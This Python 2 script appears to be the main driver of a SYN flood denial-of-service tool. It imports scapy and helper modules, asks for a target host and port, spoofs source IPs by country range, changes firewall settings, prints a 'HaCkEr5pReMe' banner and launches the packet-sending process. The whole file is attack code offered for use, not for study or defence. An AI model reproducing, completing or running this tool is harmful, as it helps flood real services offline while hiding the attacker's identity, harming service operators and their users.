#!/usr/bin/env python

import multiprocessing
from scapy.all import *	
import socket
import os
import random
import time
import requests
from userinputs_synflood import *
from Ipchanging_synflood import *
from definepacket_synflood import *
from uanonymizedIP_synflood import *
from proceedtarget_synflood import *
from configurefw_synflood import *
yourIP = uanoIP()	
supcountries = supcountries()
destination = definetarget()
destinationnew = proceedtarget(destination)
targetport = defineporttarget()
awnser_anonymizing = anonymizing_input(supcountries)



if awnser_anonymizing == yourIP:
   Ip_range = yourIP
   configurefw('restrict')
   time.sleep(5)
   os.system('clear')
   print 'HaCkEr5pReMe'
   print ''
   print 'Attack starting'

if type(awnser_anonymizing) == str and awnser_anonymizing != yourIP:  
    Ip_range = awnser_anonymizing
    time.sleep(5)
    os.system('clear')
    print 'HaCkEr5pReMe'
    print ''
    print 'Attack starting'
    


if type(awnser_anonymizing) == list and awnser_anonymizing[0] in supcountries:
        useriprange = chooseiprange(awnser_anonymizing, supcountries)
        Ip_range = ipRange(useriprange)
        time.sleep(5)
        os.system('clear')
        print 'HaCkEr5pReMe'
        print ''
        print 'Attack starting'
        



try:
  p = multiprocessing.Process(target= sendpacket, args=(Ip_range, destinationnew, targetport, destination))
  p.start()
  p.join()
except KeyboardInterrupt:
  configurefw('reset')
  exit(0)





        
        
        

